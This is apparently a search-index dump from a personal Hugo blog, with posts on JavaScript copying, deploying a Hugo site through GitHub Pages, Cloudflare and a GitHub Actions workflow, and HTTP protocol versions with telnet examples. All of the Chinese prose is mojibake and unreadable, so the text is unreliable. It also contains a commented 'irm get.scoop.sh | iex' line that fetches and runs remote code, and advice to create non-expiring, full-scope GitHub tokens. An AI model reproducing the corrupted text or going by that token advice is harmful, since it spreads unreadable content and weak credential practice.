æ”¹è®Šæ–°ç‰©ä»¶åŸºæœ¬å‹åˆ¥çš„å€¼ä¸æœƒä½¿åŸç‰©ä»¶å°æ‡‰çš„å€¼ä¸€èµ·æ”¹è®Šï¼Œä½†æ˜¯æ”¹è®Šæ–°ç‰©ä»¶å¼•ç”¨å‹åˆ¥çš„å€¼æœƒä½¿åŸç‰©ä»¶å°æ‡‰çš„å€¼ä¸€åŒæ”¹è®Šã€‚ æ·±æ‹·è² æ”¹è®Šæ–°ç‰©ä»¶åŸºæœ¬å‹åˆ¥å’Œå¼•ç”¨å‹åˆ¥çš„å€¼ï¼Œéƒ½ä¸æœƒå½±éŸ¿åŸç‰©ä»¶ï¼Œå…©è€…äº’ç›¸ç¨ç«‹ï¼Œäº’ä¸å½±éŸ¿ã€‚ ","date":"2022-08-09T00:00:00Z","image":"https://live.staticflickr.com/65535/52277851687_14d13f49a6_o.jpg","permalink":"https://wayneblog.ga/2022-08-09/js-deep-copy-vs-shallow-copy/","title":"JavaScriptçš„è¨˜æ†¶é«”ç©ºé–“ã€è³¦å€¼å’Œæ·±æ·ºæ‹·è²"},{"content":" å®‰è£ hugo homebrew (MacOs) 1 brew install hugo scoop (Windows) 1 2 3 4 5 6 7 8 9 10 11 12 # è‹¥æœªå®‰è£é Scoopï¼Œéœ€å…ˆï¼š # 1. ç¬¬ä¸€æ¬¡éœ€å…ˆè¨­å®šï¼Œå…è¨±é ç«¯è…³æœ¬ # Set-ExecutionPolicy RemoteSigned -Scope CurrentUser # 2. ä¸‹è¼‰ä¸¦å®‰è£ Scoop # irm get.scoop.sh | iex # é€é Scoop å®‰è£ Hugo scoop install hugo # or å®‰è£æ“´å±•ç‰ˆæœ¬ # scoop install hugo-extended apt-get (Linux) 1 sudo apt-get install hugo åˆ©ç”¨ hugo å»ºç«‹ç¶²ç«™ 1 2 # é€²åˆ°æœ¬åœ°è³‡æ–™å¤¾æ ¹ç›®éŒ„å¾Œ hugo new site . --force ä¸‹è¼‰ä¸»é¡Œæ¨¡æ¿ (ä»¥ hugo-theme-stack ç‚ºä¾‹) 1 git submodule add git://github.com/CaiJimmy/hugo-theme-stack/ themes/hugo-theme-stack clone å®Œç•¢å¾Œï¼ŒæŠŠ exampleSite æ–‡ä»¶å¤¾ä¸­çš„ config.yaml è¤‡è£½åˆ°ç«™é»ç›®éŒ„ä¸‹ï¼ŒåŒæ™‚åˆªé™¤æ­¤ç›®éŒ„ä¸‹çš„ config.toml æ–‡ä»¶ã€‚\nå°‡ exampleSite/content/* è¤‡è£½åˆ°ç«™é»ç›®éŒ„ä¸‹çš„ content/\nå‰©é¤˜ä¸»é¡Œçš„è¨­å®šèˆ‡æ–‡ç« å…§å®¹ï¼Œå¯ä¾å€‹äººéœ€æ±‚è‡ªè¡Œè¨­å®šï¼Œæœ¬ç¯‡ä¸å†è´…è¿°ã€‚\ngithub å‰µå»ºä¸€å€‹ public çš„ repoï¼Œç”¨æ–¼å­˜æ”¾ç™¼å¸ƒç”¨çš„ public è³‡æ–™å¤¾ã€‚ å‰å¾€ repo çš„ Settings -\u0026gt; Pages è¨­å®šå¥½æ¬²ç™¼å¸ƒçš„åˆ†æ”¯èˆ‡ root path è¨­å®šå®Œç•¢å¾Œï¼Œgithub æœƒåˆ†é…çµ¦ä½ ä¸€å€‹å…¬é–‹çš„ç¶²å€ï¼šhttps://{your-account}.github.io/{your-repo-name}/ï¼Œè‹¥ä¸éœ€è‡ªå®šç¾©ç¶²å€èˆ‡ CI/CD æµç¨‹ï¼Œåˆ°æ­¤æ­¥é©Ÿå³å¯å®Œç•¢ã€‚\nè¨­å®šè‡ªå®šç¾©ç¶²å€ è¨»å†Šä¸€å€‹ç¶²å€ æœ¬æ–‡ä½¿ç”¨ freenom è¨»å†Šä¸€çµ„å…è²»çš„ç¶²å€ è¨»å†Šå®Œç•¢å¾Œï¼Œå‰å¾€ Manage Domain é¸æ“‡ Management Tools -\u0026gt; NameServers å¾Œï¼Œæ­¤é é¢å…ˆæš«æ™‚æ”¾ç½®è‘—ï¼Œå¾…æœƒå†å›ä¾†ç¹¼çºŒè¨­å®š å‰å¾€ Cloudflare å¾Œå° ç™»å…¥ Cloudflare å¾Œå°ï¼Œä¸¦é¸æ“‡ ç¶²ç«™ DNS è¨­å®šå¦‚åœ–ï¼š å°‡è¨»å†Šçš„ domain è¨­å®šæŒ‡å‘åˆ° github server ip 185.199.108.153 185.199.109.153 185.199.110.153 185.199.111.153 è¨­å®š CNAME www æŒ‡å‘åˆ°å‰›å‰› github åˆ†é…çµ¦ä½ çš„ domain (pathä¸éœ€è¦)ï¼š https://{your-account}.github.io/ å°‡ä¸‹æ–¹å…©å€‹ Cloudflare åç¨±ä¼ºæœå™¨è¤‡è£½ä¸‹ä¾† é¸æ“‡ Use custom nameservers (enter below) å°‡å‰›å‰›å¾ Cloudflare è¤‡è£½çš„å…©å€‹ NameServerï¼Œè²¼åˆ° NameServer 1ã€NameServer 2 Cloudflare å¾Œå°è¨­å®šå¼·åˆ¶ä½¿ç”¨ SSL é»é¸ SSL/TLS çš„ é‚Šç·£æ†‘è­‰ æ‰“é–‹ ä¸€å¾‹ä½¿ç”¨HTTPS å›åˆ° github pagesï¼Œå°‡ç¶²å€å¡«å¯«è‡³ Custom domainï¼ŒçŸ­æš«é©—è­‰å®Œç•¢å¾Œï¼Œå³å¯é»é¸ Save é€å‡ºè¨­å®š è‡ªå®šç¾©ç¶²å€å·²è¨­å®šå®Œç•¢ï¼Œå¯ä½¿ç”¨ç¶²å€æ‰“é–‹ç¶²ç«™ã€‚\nè¨­å®š github actions åš CI/CD æº–å‚™ææ–™1ï¼šç”Ÿæˆ github personal access tokens å‰å¾€ github çš„å€‹äººè¨­å®š \u0026quot;Settings\u0026quot;ï¼Œä¸‹æ–¹é»é¸ Developer settings\né»é¸ Generate new token\nè¨­å®šå‚™è¨»ã€éæœŸæ™‚é–“ã€æ¬Šé™å¾Œå³å¯ç”Ÿæˆ token\nå»ºè­°éæœŸæ™‚é–“å¯ä»¥è¨­å®š No expiration (ç„¡éæœŸæ™‚é–“)ã€æ¬Šé™è¨­å®š repo å…¨éƒ¨å‹¾é¸ ç”Ÿæˆå¾Œï¼Œtoken è«‹è¤‡è£½èµ·ä¾†ï¼Œå› ç‚ºé—œé–‰æ­¤é é¢å¾Œï¼Œå°‡ç„¡æ³•å†å–å¾—è©² token çš„æ˜ç¢¼ã€‚\næº–å‚™ææ–™2ï¼šç™»å…¥ Cloudflare å¾Œå°ï¼Œå–å¾— å€åŸŸè­˜åˆ¥ç¢¼(Zone) ç™»å…¥ Cloudflareï¼Œé¸æ“‡è‡ªå·±çš„ domain é»é¸ æ¦‚è§€ï¼Œä¸¦æ–¼åœ–ä¸­æ¨™ç¤ºè™•å–å¾— å€åŸŸè­˜åˆ¥ç¢¼(Zone Id) æº–å‚™ææ–™3ï¼šå–å¾— Global API Key æ–¼ æ¦‚è§€ ä¸‹æ–¹é»é¸ å–å¾—æ‚¨çš„ API Token é»é¸ æª¢è¦–ï¼Œè¼¸å…¥å¯†ç¢¼å¾Œå–å¾— Global API Key æº–å‚™ææ–™4ï¼šç”Ÿæˆ API token é»é¸ å»ºç«‹ Token -\u0026gt; å»ºç«‹è‡ªè¨‚ Token è¨­å®š token åç¨±ã€æ¬Šé™ã€TTL PSï¼šæ¬Šé™å¿…é ˆè‡³å°‘æ“æœ‰ å€åŸŸ -\u0026gt; å¿«å–æ¸…é™¤ -\u0026gt; æ¸…é™¤ï¼Œä»¥ä¾¿ CI/CD å¾Œä½¿ç”¨ token æ¸…é™¤ DNS cache è¨­å®šå®Œç•¢å¾Œå³å¯å»ºç«‹ token å»ºç«‹å¾Œï¼Œä¹Ÿè«‹å°‡ token è¤‡è£½èµ·ä¾†ï¼Œå› ç‚ºé—œé–‰æ­¤é é¢å¾Œï¼Œå°‡ç„¡æ³•å†å–å¾—è©² token çš„æ˜ç¢¼ã€‚ ææ–™æº–å‚™å®Œç•¢ï¼Œé–‹å§‹è¨­å®š secret é€²å…¥ source code çš„ repoï¼Œé»é¸ Settings -\u0026gt; Secret -\u0026gt; Actionsï¼Œä¸¦å°‡å‰›å‰›çš„å››å€‹æº–å‚™ææ–™è¨­å®šåˆ° Actions secrets ä¸­ æ­¤è™• Actions secrets çš„åç¨±å¦‚éœ€ä¿®æ”¹ï¼Œå‰‡å¾…æœƒçš„ github-actions.yml å…§çš„åç¨±ä¹Ÿéœ€è·Ÿè‘—ä¿®æ”¹ï¼Œå¦å‰‡æœƒæŠ“ä¸åˆ° secrets ä¸­è¨­å®šçš„å€¼å“¦!\næ–¼ source code repo æ ¹ç›®éŒ„æ–°å¢ .github/workflows/github-actions.yml github-actions.yml å…§å®¹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 name: Auto build and publish to public site repository # åªæœ‰æ¨é€åˆ° main æ‰è§¸ç™¼ on: push: branches: - \u0026#34;main\u0026#34; pull_request: branches: [\u0026#34;main\u0026#34;] jobs: hugo-publish: name: publish content to public site runs-on: ubuntu-latest steps: # ä½¿ç”¨ç•¶å‰ source code çš„ repo - name: checkout source code repo uses: actions/checkout@v3 with: # å› ç‚ºç›®å‰çš„ repo æœ‰ä½¿ç”¨åˆ° submodule(hugo themes)ï¼Œæ‰€ä»¥ submodule ä¹Ÿè¦ä¸€ä½µåŒæ­¥ï¼Œä¸ç„¶åŸæœ¬çš„ repo æ˜¯æ²’æœ‰ submodule çš„å…§å®¹ submodules: true token: ${{ secrets.ACCESS_TOKEN }} # public ç¶²ç«™æ˜¯æ”¾ç½®åœ¨å¦ä¸€å€‹ repo æ‰€ä»¥é€™è£¡ä¹Ÿè¦ clone ä¸€ä»½ä¸‹ä¾†è™•ç† # å› ç‚ºæˆ‘ Hugo é è¨­æ˜¯ç”¢ç”Ÿæª”æ¡ˆåˆ° public è³‡æ–™å¤¾ï¼Œæ‰€ä»¥å°‡ public repo clone åˆ° ./public/ å…§ï¼Œä»¥ä¾¿å¾ŒçºŒ publish - name: clone and checkout public repo uses: actions/checkout@v3 with: # é€™è£¡æ˜¯ public ç¶²ç«™åœ¨ github ä¸Šçš„ repo åç¨± repository: {template/template-public-repo-name} path: public # tip: éœ€äº‹å…ˆç”¢ç”Ÿä¸€æŠŠ personal access token æ”¾åˆ° repo çš„ secrets è£¡ # ç„¶å¾Œ secrets è£¡çš„åç¨±å°±å« ACCESS_TOKEN # åƒè€ƒ https://help.github.com/en/actions/automating-your-workflow-with-github-actions/authenticating-with-the-github_token token: ${{ secrets.ACCESS_TOKEN }} # ä½¿ç”¨åˆ¥äººåšå¥½çš„ Hugo Actions - name: setup hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: latest extended: true # ç”¨ Hugo ç”¢ç”Ÿæª”æ¡ˆ - name: build content to public site working-directory: ./ # --cleanDestinationDir æ¸…é™¤èˆŠæª”æ¡ˆ run: hugo --minify --gc --cleanDestinationDir # å°‡æª”æ¡ˆ commit åˆ° ç¶²ç«™ public repo - name: deploy and publish updates working-directory: ./public # user.email é‚„æœ‰ user.name å¯ä»¥å–è‡ªå·±å–œæ­¡çš„ï¼Œä¸€å®šè¦è¨­å®šä¸ç„¶æœƒå‡ºéŒ¯ run: | # ç•¶ git æœ‰æ›´å‹•æ™‚æ‰é€²è¡Œå‹•ä½œ if [[ `git status --porcelain` ]]; then git config --local user.email \u0026#34;{typing your email}\u0026#34; git config --local user.name \u0026#34;{typing your name}\u0026#34; git add . -A git commit -m \u0026#34;build: auto publish\u0026#34; git push origin else echo \u0026#34;content no changes\u0026#34; fi # æ¸…é™¤ cloudflare dns cache - name: clear cloudflare cache uses: nathanvaughn/actions-cloudflare-purge@master with: # Using Zone Id cf_zone: ${{ secrets.CLOUDFLARE_ZONE }} # Using API Token cf_auth: ${{ secrets.CLOUDFLARE_API_TOKEN }} å…§å®¹ {} å…§çš„è³‡è¨Šè«‹æ›´æ›æˆè‡ªå·±çš„è³‡è¨Š\né™„ä¸Š yaml ç¯„ä¾‹ï¼Œè©³ç´° github-actions.yaml æ–‡ä»¶è«‹æŸ¥é–± github å®˜æ–¹æ–‡ä»¶\nå»ºç«‹æª”æ¡ˆå¾Œï¼Œå°‡ commit push å¾Œï¼Œå³å¯æ–¼ source code repo çš„ Actions é é¢æŸ¥çœ‹ CI/CD çš„éç¨‹ã€‚ ","date":"2022-08-01T00:00:00Z","image":"https://live.staticflickr.com/65535/52274839367_8325e83fea_o.jpg","permalink":"https://wayneblog.ga/2022-08-01/hugo-github-pages-actions-and-cloudflare/","title":"æ¶è¨­éƒ¨è½æ ¼ä¹‹ä¸€æ¢é¾å…è²»å¯¶å…¸ï¼šHugo ç”Ÿæˆéœæ…‹ç¶²ç«™ã€Pages ç™¼å¸ƒç¶²ç«™ã€è¨­å®š custom domain(free 12 months)ã€Actions åš CI/CD"},{"content":" åƒè€ƒç¶²ç«™ - åˆå­¸è€…éƒ½è©²å­¸æœƒçš„ HTTP é€šè¨Šå”å®šåŸºç¤\nåƒè€ƒç¶²ç«™ - Http/2 æ˜¯ä»€éº¼?\nç›®å‰ HTTP é€šè¨Šå”å®šçš„ç‰ˆæœ¬ HTTP/0.9 æ–¼ 1991 å¹´ç™¼è¡¨(å·²å»¢æ­¢) HTTP/1.0 æ–¼ 1996 å¹´ 5 æœˆç™¼è¡¨(RFC 1945) HTTP/1.1 æ–¼ 1997 å¹´ 1 æœˆç™¼è¡¨(RFC 2068) æ–¼ 1999 å¹´ 6 æœˆç™¼å¸ƒ HTTP/1.1 æ›´æ–°ç‰ˆ(RFC 2616) æ–¼ 2014 å¹´ 6 æœˆå†æ¬¡æ›´æ–° HTTP/1.1 ä¸¦å°‡è¦æ ¼æ–‡ä»¶æ‹†æˆå…­ä»½ HTTP/2(Wikipedia) æ–¼ 2015 å¹´ 5 æœˆç™¼å¸ƒ(RFC 7540)(ç€è¦½å™¨ç›¸å®¹æ€§) åƒ…é‡å° HTTP/1.1 çš„ Message Syntax éƒ¨åˆ†ä½œå‡ºå¼·åŒ– HTTP/0.9 (å·²å»¢æ­¢) æ¦‚è¦ æ–¼ 1990 å¹´ç”± Tim Berners-Lee æå‡ºæœ€åˆçš„ HTTP å»ºè­°(WWW)\nå¯¦ä½œé‡é»\nç”¨æˆ¶ç«¯è¦æ±‚æ˜¯ä»¥ ASCII å­—å…ƒç‚ºä¸»(å–®è¡Œå‘½ä»¤å³å¯ç™¼å‡ºè«‹æ±‚ GET/) ç”¨æˆ¶ç«¯è¦æ±‚æœƒä»¥ä¸€å€‹ æ›è¡Œå­—å…ƒ (CRLF) ä¾†çµæŸ ä¼ºæœå™¨å›æ‡‰æ˜¯ä»¥ ASCII å­—å…ƒç‚ºä¸»ï¼Œå›æ‡‰å…§å®¹æ˜¯ HTML æ–‡ä»¶ æ¯æ¬¡åŸ·è¡Œå®Œ Request / Response å°±æœƒè‡ªå‹•é—œé–‰é€£ç·š ä¸»è¦ç‰¹è‰²\nClient / Server æ¶æ§‹ã€Request / Response å”å®š è·‘åœ¨ TCP/IP ä¸Šçš„ ASCII å”å®š (è¦æ±‚/å›æ‡‰) è¢«è¨­è¨ˆç”¨ä¾†å‚³è¼¸ HTML æ–‡ä»¶ æ¯å®Œæˆä¸€æ¬¡ ASCII å”å®šå°±æœƒè‡ªå‹•é—œé–‰é€£ç·š ä½¿ç”¨ bash æ¸¬è©¦ 1 2 3 4 5 6 7 8 # å»ºç«‹é€£ç·šåˆ° google $ telnet google.com 80 \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # ç™¼é€ GET è«‹æ±‚ $ GET /about \u0026gt; ... HTTP/1.0 æ¦‚è¦ åœ¨ 1991 åˆ° 1995 å¹´ä¹‹é–“ï¼Œæ‰€è¬‚ ç€è¦½å™¨ é¨°ç©ºå‡ºä¸–ï¼\næ–¼ 1996 å¹´ 5 æœˆç™¼è¡¨ HTTP/1.0 ç‰ˆ (RFC 1945)\nèˆ‡ HTTP/0.9 ä¸åŒçš„éƒ¨åˆ†\nç”¨æˆ¶ç«¯è¦æ±‚æ˜¯ä»¥ ASCII å­—å…ƒç‚ºä¸»ï¼Œä½†å¯ç™¼é€å¤šè¡Œå‘½ä»¤(å«è¦æ±‚æ¨™é ­) å…ˆé€å‡ºè¦æ±‚æ–¹æ³•ï¼Œå†é€å‡ºè¦æ±‚æ¨™é ­ï¼Œæœ€å¾Œä»¥ä¸€å€‹é¡å¤–çš„æ›è¡Œå­—å…ƒçµæŸ ä¼ºæœå™¨å›æ‡‰æ˜¯ä»¥ ASCII å­—å…ƒç‚ºä¸»ï¼Œå›æ‡‰å…§å®¹æœƒå€åˆ†ç‚º ç‹€æ…‹åˆ— å›æ‡‰æ¨™é ­ å›æ‡‰å…§æ–‡ä¸»é«”(ä¸åƒ…åƒ…æ˜¯ HTML æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯æ›´å¤šå…§å®¹é¡å‹) æ¯å®Œæˆä¸€æ¬¡ Request / Response äº¤æ¡å°±æœƒè‡ªå‹•é—œé–‰ TCP/IP é€£ç·š ä½¿ç”¨ bash æ¸¬è©¦ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # å»ºç«‹é€£ç·šåˆ° google $ telnet google.com 80 \u0026gt; Trying 172.217.24.14... \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # ç™¼é€ GET è«‹æ±‚ $ GET /about HTTP/1.0 Host: www.google.com # å› ä¸€å€‹ domain å¯ä»¥ hosting å¤šå€‹ç¶²ç«™ï¼Œå› æ­¤é€šå¸¸éƒ½æœƒæ–¼ request header å†æ¨™è¨˜ Host \u0026gt; HTTP/1.0 301 Moved Permanently \u0026gt; ... # å–å¾—å¾Œï¼Œæœƒè‡ªå‹•ä¸­æ–· TCP é€£ç·š # è‹¥éœ€å†ç™¼é€è«‹æ±‚ï¼Œéœ€é‡æ–°å»ºç«‹ TCP é€£ç·š $ telnet google.com 80 ... HTTP/1.1 æ¦‚è¦ æ–¼ 1997 å¹´ 1 æœˆç™¼è¡¨ HTTP/1.1 ç‰ˆ (RFC 1945)\næ–¼ 1999 å¹´ 6 æœˆç™¼å¸ƒ HTTP/1.1 æ›´æ–°ç‰ˆ (RFC 2616)\nèˆ‡ HTTP/1.0 ä¸åŒçš„éƒ¨åˆ†\nå‚³è¼¸å”è­°çš„æ•ˆèƒ½æ”¹é€²(æ–°å¢ä¸å°‘ HTTP æ¨™é ­å®šç¾©) æŒçºŒé€£ç·šç‹€æ…‹(persistent connection) åˆ‡å¡Šç·¨ç¢¼å‚³è¼¸(chunked encoding transfer) ä½å…ƒç¯„åœè«‹æ±‚(byte range request) é¡å¤–å¿«å–æ©Ÿåˆ¶(cache control) è«‹æ±‚ç®¡ç·šä½œæ¥­(request pipelining)(éœ€æ­é…æŒçºŒé€£ç·šç‹€æ…‹ç‰¹æ€§æ‰èƒ½ç”¨) ä½¿ç”¨ bash æ¸¬è©¦ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # å»ºç«‹é€£ç·šåˆ° google $ telnet google.com 80 \u0026gt; Trying 172.217.24.14... \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # ç™¼é€ GET è«‹æ±‚ $ GET /about HTTP/1.1 Host: www.google.com # å› ä¸€å€‹ domain å¯ä»¥ hosting å¤šå€‹ç¶²ç«™ï¼Œå› æ­¤é€šå¸¸éƒ½æœƒæ–¼ request header å†æ¨™è¨˜ Host \u0026gt; HTTP/1.0 301 Moved Permanently \u0026gt; ... # å–å¾—å¾Œï¼Œä¸æœƒè‡ªå‹•ä¸­æ–· TCP é€£ç·šï¼Œå¯å†ç™¼é€è«‹æ±‚ $ GET /abc HTTP/1.1 Host: www.google.com # å› ä¸€å€‹ domain å¯ä»¥ hosting å¤šå€‹ç¶²ç«™ï¼Œå› æ­¤é€šå¸¸éƒ½æœƒæ–¼ request header å†æ¨™è¨˜ Host \u0026gt; HTTP/1.1 404 Page Not Found \u0026gt; ... ç›®å‰ HTTP/1.1 çš„å…­å¤§è¦æ ¼ RFC 7230 HTTP/1.1ï¼šMessage Syntax and Routing RFC 7231 HTTP/1.1ï¼šSemantics and Content(æœ€é‡è¦) RFC 7232 HTTP/1.1ï¼šConditional Requests RFC 7233 HTTP/1.1ï¼šRange Requests RFC 7234 HTTP/1.1ï¼šCaching RFC 7235 HTTP/1.1ï¼šAuthentication é—œæ–¼ HTTP é€šè¨Šå”å®šçš„åŸºæœ¬å¸¸è­˜ ç„¡ç‹€æ…‹ç‰¹æ€§(stateless)ï¼šç›¸åŒçš„ requestï¼Œéƒ½æœƒå¾—åˆ°ç›¸åŒçš„ responseï¼Œä¸æœƒå› ç‚ºç‹€æ…‹ä¸åŒè€Œæ”¹è®Š åˆ†æ•£å¼æ¶æ§‹(distributed)ï¼šç›¸åŒçš„ requestï¼Œä¸åŒè¼‰é«”ç™¼é€ï¼Œéƒ½æœƒå¾—åˆ°ç›¸åŒçš„ response å”ä½œçš„æ¶æ§‹(collaborative)ï¼šä¸ä¸€å®šåªæœ‰ client / serverï¼Œä¹Ÿå¯ä»¥æ˜¯ client / proxy / reverse proxy / server è¶…æ–‡æœ¬(hypertext = not just \u0026ldquo;text) but with \u0026ldquo;links\u0026rdquo;)ï¼šé™¤äº†å…§å®¹ï¼Œé‚„åŒ…å«é€£çµ åˆå­¸è€…æ‡‰äº†è§£ HTTP çš„åŸºæœ¬é‹ä½œæ–¹å¼ å¦‚ä½•ç™¼å‡º HTTP è¦æ±‚(HTTP Request)\nè¦æ±‚æ–¹æ³•(Request Methods) GETã€POSTã€PUTã€DELETEã€PATCHã€\u0026hellip; è¦æ±‚æ¨™é ­(Request Headers) Connectionã€COntent-Typeã€\u0026hellip; æ–·è¡Œç¬¦è™Ÿ(CRLF) è¦æ±‚å…§å®¹ä¸»é«”(Request Body) å¦‚ä½•å›æ‡‰ HTTP è¨Šæ¯(HTTP Response)\nå›æ‡‰ç‹€æ…‹ç¢¼(Response Status Codes) HTTP/1.1 200 OK å›æ‡‰æ¨™é ­(Response Headers) æ–·è¡Œç¬¦è™Ÿ(CRLF) å›æ‡‰å…§å®¹ä¸»é¡Œ(Response Body) HTTP/2 HTTP/2 å„å€‹ç€è¦½å™¨çš„æ”¯æ´åº¦ é»æˆ‘æŸ¥çœ‹ç€è¦½å™¨æ”¯æ´åº¦\nEdge / Firefox / Chrome / Opera çš†åœ¨ 2015 å¹´èµ·å°±æ”¯æ´ HTTP/2ï¼ŒåŸºæœ¬ä¸Šä¸éœ€è¦å¤ªæ“”å¿ƒä¸»æµç€è¦½å™¨çš„æ”¯æ´æ€§å•é¡Œã€‚\nPSï¼šå¦‚ä½•åœ¨ Node.js ä¸­ä½¿ç”¨ HTTP/2\nHTTP/2 æ”¹å–„äº†ä»€éº¼ï¼Ÿ http/2æ¨™æº–ç™¼å¸ƒæ–¼2015å¹´5æœˆï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯é€éä¸€äº›æªæ–½æ”¹å–„ç€è¦½å™¨ç€è¦½ç¶²é  åŠ è¼‰çš„é€Ÿåº¦(page load) ã€‚ç›®å‰å¤§å¤šæ•¸çš„ç€è¦½å™¨å·²æ”¯æ´ http/2 (chrome, firefox, safariç­‰)æ¨™æº–ï¼Œåˆ http/2èˆ‡ http/1.1æœ‰è‘—é«˜åº¦çš„ç›¸å®¹ä¿¡ï¼Œèˆ‰å‡¡request method(post, get..etc), http status code, url, header ç­‰ç­‰ï¼Œå› æ­¤å°æ–¼web developerä¾†èªªï¼Œåªéœ€è¦ç¢ºä¿ä½ çš„ç¶²ç«™æœ‰æ”¯æ´https(å› ç‚ºç€è¦½å™¨åªæ”¯æ´https åœ¨http/2ä¸Š)ã€‚é‚£éº¼http/1.1èˆ‡http/2åˆ°åº•ç›¸å·®å¤šå¿«å‘¢ï¼Œé»æˆ‘é«”é©—!\nHTTP/2 æ˜¯å¦‚ä½•æ”¹å–„ï¼Ÿ åªéœ€è¦å–®ä¸€ç¶²è·¯é€£ç·š (Single TCP connection) åªéœ€è¦å–®ä¸€ç¶²è·¯é€£ç·šï¼Œå°±å¯ä»¥é€£æ¥ç¶²ç«™ä¼ºæœå™¨ï¼Œä¸‹è¼‰æ‰€æœ‰éœ€è¦çš„è³‡æºã€‚å¤§å¤§ç¯€çœ HTTP/1.1 éœ€è¦ä¸€ç›´å»ºç«‹å¤šå€‹ç¶²è·¯é€£ç·šæ™‚çš„å•Ÿå‹•æ™‚é–“æµªè²»ã€‚\nRequest and response multiplexing (å¤šè·¯è¤‡ç”¨) åœ¨ http/1.1 ä¸­ï¼Œclient ç«¯æ™‚å¸¸æœƒåŒæ™‚ç™¼èµ·å¤šå€‹ request è‡³ server æ‹¿å–æª”æ¡ˆ(åƒæ˜¯js, css, imageç­‰)ï¼Œä»¥æ­¤æ–¹å¼é”åˆ°å¿«é€Ÿè¼‰å…¥é é¢ã€‚å¦‚ä¸‹åœ–åœ¨ http/1.1 ä¸­æœƒåŒæ™‚èˆ‡ server å»ºç«‹3å€‹ TCP connectionï¼Œä½†æ˜¯ç€è¦½å™¨é€šå¸¸æœƒé™åˆ¶ TCP connection åŒæ™‚å»ºç«‹çš„æ•¸ç›®ã€‚å› æ­¤åœ¨ http/2 å”å®šä¸­ï¼Œå…è¨± client ç«¯èˆ‡åŒä¸€ server å»ºç«‹å–®ä¸€ TCP connection ä¸¦ä»¥éåŒæ­¥æ–¹å¼å‚³è¼¸è¦çš„æª”æ¡ˆã€‚\nå„ªå…ˆæ¬Šè¨­è¨ˆ (Prioritization) ä¼ºæœå™¨å¯ä»¥æ±ºå®šä¾‹å¦‚ CSS æˆ– JavaScript æª”æ¡ˆï¼Œå“ªäº›è¦å„ªå…ˆå‚³é€ã€‚\nHeader compression (æ¨™é ­å£“ç¸®) æ¯ä¸€å€‹ http çš„å‚³è¼¸ä¸­éƒ½æœƒæ”œå¸¶ä¸€çµ„ headerï¼Œåœ¨ http/1.1 ä¸­ï¼Œheader æœƒæ˜¯ä»¥æ˜æ–‡(plain text)å‚³è¼¸å¤§å°é€šå¸¸æœƒæ˜¯500-800 bytesï¼Œè‹¥æœ‰æ”œå¸¶ cookie ä¹Ÿæœ‰å¯èƒ½æœƒæ›´å¤§ã€‚å› æ­¤åœ¨ http/2 ä¸­ï¼Œæœƒå°‡ request ä»¥åŠ response çš„ header ä½¿ç”¨ HPACK æ¼”ç®—æ³•å£“ç¸® header çš„å…§å®¹ï¼Œæ­¤æ–¹æ³•å£“ç¸®å¾Œå¯ä»¥æ¸›å°‘ 85%-88% çš„å¤§å°ã€‚\nServer push (ä¼ºæœå™¨æ¨é€) åœ¨ http/1.1 ä¸­ï¼Œé€šå¸¸ client ç«¯ request ç”šéº¼ server å°±æœƒå›å‚³ç”šéº¼ï¼Œä¾‹å¦‚: ç•¶ client request html é‚£éº¼ server å°‡åªæœƒå›å‚³ htmlã€‚ä½†åœ¨ http/2 ä¸­ï¼Œå…è¨± server ä¸»å‹•æ¨é€æœ‰ç›¸é—œçš„è³‡æ–™çµ¦ clientï¼Œä¾‹å¦‚: ç•¶ client åª request htmlï¼Œä½†æ˜¯ server çŸ¥é“ client request æ­¤ html å¾ŒçºŒä¹Ÿæœƒ request css, js ç­‰ï¼Œå› æ­¤ server å°±æœƒåœ¨ client æ²’æœ‰ request çš„æƒ…æ³ä¸‹ä¸»å‹•æ¨é€ css, js æª”çµ¦ clientã€‚é‚£ server æ€éº¼çŸ¥é“é€™äº›æª”æ¡ˆæ˜¯æœ‰ç›¸é—œæ€§çš„å‘¢? web developer å°‡éœ€è¦ server push çš„æª”æ¡ˆåŠ ä¸Šç‰¹å®šçš„æè¿°å³å¯ã€‚(æè¿°)\nä¸éï¼Œé€™å€‹åŠŸèƒ½æ¯”è¼ƒæœ‰çˆ­è­°ï¼Œä¸€ä¾†ä»–éœ€è¦ Web é–‹ç™¼è€…é¡å¤–æè¿°æœ‰å“ªäº›æª”æ¡ˆéœ€è¦éš¨è‘— HTML ä¸€èµ·æ¨é€çµ¦ç€è¦½å™¨ï¼Œä¸æ˜¯ Web ä¼ºæœå™¨å‡ç´š HTTP/2 å°±è‡ªå‹•æœƒæœ‰ã€‚äºŒä¾†å®ƒä¸ç®¡ç€è¦½å™¨æ˜¯ä¸æ˜¯å·²ç¶“æœ‰å¿«å–é€™å€‹è³‡æºï¼Œéƒ½æœƒæ¨é€è€Œé€ æˆé »å¯¬æµªè²»ã€‚å› æ­¤å¯¦å‹™ä¸Šç­†è€…èªç‚ºå¯ä»¥æ”¹ç”¨ç€è¦½å™¨çš„ Prefetch åŠŸèƒ½ï¼Œè®“å®¢æˆ¶ç«¯çš„ç€è¦½å™¨è‡ªå·±è™•ç†å³å¯ã€‚\nBinary framing layer (äºŒé€²åˆ¶å½±æ ¼å±¤) åœ¨ http/2 ä¸­ï¼Œheader èˆ‡ body æ‰€æŒ¾å¸¶çš„ property èˆ‡ http/1.1 ç›¸åŒ(ex. verbs, methods)ï¼Œç„¶è€Œå…©è€…åœ¨å‚³è¼¸ä¸Šæœƒæœ‰ä¸åŒã€‚åœ¨ http/2 ä¸­ï¼Œæœƒå°‡ header ä»¥åŠ body ç·¨ç¢¼æˆäºŒé€²åˆ¶åœ¨ server èˆ‡ client ç«¯ä¸­å‚³è¼¸ï¼Œåœ¨ http/1.1 